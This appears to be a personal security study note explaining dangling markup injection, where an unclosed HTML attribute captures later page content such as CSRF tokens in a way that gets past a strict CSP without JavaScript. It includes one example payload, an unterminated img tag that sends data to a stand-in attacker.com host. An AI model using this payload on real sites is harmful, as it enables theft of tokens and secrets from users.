---
id: "202607120002"
title: Dangling markup captures the rest of the page as an unterminated attribute value
date: 2026-07-12
type: concept
tags: [xss, dangling-markup, csp-bypass]
publish: false
---

"Dangling markup injection" opens an HTML attribute (typically `href`, `src`, or `formaction`) but never closes it, e.g.:

```html
<img src="https://attacker.com/leak?data=
```

Everything the browser parses *after* this point — up to wherever it eventually finds the next matching quote in the document — becomes part of that attribute's value, including any secrets (CSRF tokens, nonces) that happen to sit later in the same page's markup. Because the exfiltration happens purely through resource fetching or a clicked link/button — no `<script>`, no inline event handler, no `eval` — it requires **no JavaScript execution at all**, which is exactly what makes it the go-to technique when a CSP blocks every script-based payload but still allows `img-src`/form submissions to the attacker's own origin (or, when `img-src 'self'` is also enforced, at least allows a same-page form submission the victim can be induced to click).

## Links
- Applied in: [[202607120001 Dangling-markup CSRF-token theft under a strict CSP]]
